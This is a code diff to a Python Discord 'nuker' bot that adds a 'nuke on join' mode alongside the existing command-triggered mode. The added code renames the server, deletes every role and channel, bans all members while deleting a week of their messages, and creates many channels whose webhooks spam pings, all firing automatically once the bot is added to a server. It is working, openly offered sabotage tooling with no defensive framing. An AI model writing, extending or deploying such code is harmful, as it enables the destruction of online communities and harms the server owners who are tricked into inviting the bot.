@@ -56,7 +56,7 @@ else:
                          'how much channels do you want?': '35', 
                          'how much roles do you want?': '40',
                          'admin role name': 'sh...'}
-    
+    config['Nuker mode'] = {'Mode': '1'}
     with open('Bin\\cfg.ini', 'w') as cfg_file:
             config.write(cfg_file)
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
@@ -82,7 +82,7 @@ howmp = int(config['BOT_CFG']['how much pings per channel do you want?'])
 howmc = int(config['BOT_CFG']['how much channels do you want?'])
 howmr = int(config['BOT_CFG']['how much roles do you want?'])
 adrn = config['BOT_CFG']['admin role name']
-
+nuker_mode = str(config['Nuker mode']['Mode'])
 
 
 
@@ -123,6 +123,20 @@ async def on_ready():
         await client.change_presence(status=discord.Status.offline)
     await rmm()
 
+@client.event
+async def on_guild_join(ctx):
+    if nuker_mode == '2':
+        await ctx.edit(name=srvn, icon=icona)
+        for rl in ctx.roles:
+            create_task(killobject(obj=rl))
+        for channel in ctx.channels:
+            create_task(killobject(obj=channel))
+        create_task(banallmode2(ctx=ctx))
+        for _ in range(howmr):
+            create_task(createrole2(ctx))
+        for _ in range(howmc):    
+            create_task(createchannel2(ctx,name=chnrln))
+
 async def killobject(obj):
     try: await obj.delete()
     except: pass
@@ -139,24 +153,35 @@ async def createchannel(ctx,name):
         create_task(sendch(ctx,wb,count=howmp))
     except: pass
 
+async def createchannel2(ctx,name):
+    try:
+        chan = await ctx.create_text_channel(name=name)
+        wb = await chan.create_webhook(name=wbn,avatar=icona)
+        create_task(sendch(ctx,wb,count=howmp))
+    except: pass
+
 async def createrole(ctx):
     try: await ctx.guild.create_role(name=chnrln)
     except: pass
 
+async def createrole2(ctx):
+    try: await ctx.create_role(name=chnrln)
+    except: pass
 
 @client.command()
 async def start(ctx):
-    await ctx.message.delete()
-    await ctx.guild.edit(name=srvn, icon=icona)
-    for rl in ctx.guild.roles:
-        create_task(killobject(obj=rl))
-    for channel in ctx.guild.channels:
-        create_task(killobject(obj=channel))
-    create_task(bananaa(ctx=ctx))
-    for _ in range(howmr):
-        create_task(createrole(ctx))
-    for _ in range(howmc):    
-        create_task(createchannel(ctx,name=chnrln))
+    if nuker_mode == '1':
+        await ctx.message.delete()
+        await ctx.guild.edit(name=srvn, icon=icona)
+        for rl in ctx.guild.roles:
+            create_task(killobject(obj=rl))
+        for channel in ctx.guild.channels:
+            create_task(killobject(obj=channel))
+        create_task(bananaa(ctx=ctx))
+        for _ in range(howmr):
+            create_task(createrole(ctx))
+        for _ in range(howmc):    
+            create_task(createchannel(ctx,name=chnrln))
 
 @client.command()
 async def admin(ctx,target):
@@ -178,6 +203,11 @@ async def bananaa(ctx):
         await member.ban(reason=br, delete_message_days=7)
       except: pass
  
+async def banallmode2(ctx):
+    for member in list(ctx.members):
+      try:
+        await member.ban(reason=br, delete_message_days=7)
+      except: pass
 
 raw_nuker_logo = '''
                      █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
@@ -194,8 +224,12 @@ raw_nuker_logo = '''
 
 
 '''
+if nuker_mode == '1':
+    nm = 'nuke on command'
+else:
+    nm = 'nuke on join'
 
-info_about_nuker = f'{Fore.MAGENTA}Curent version: ' + f'{Fore.LIGHTGREEN_EX}v' + nversion + f'{Fore.MAGENTA}' + '     Prefix: ' + prefix
+info_about_nuker = f'{Fore.MAGENTA}Curent version: {Fore.LIGHTGREEN_EX}v{nversion} {Fore.MAGENTA}     Prefix: {prefix}    Mode:{Fore.LIGHTGREEN_EX} {nm}'
 
 empty_space = '''
 
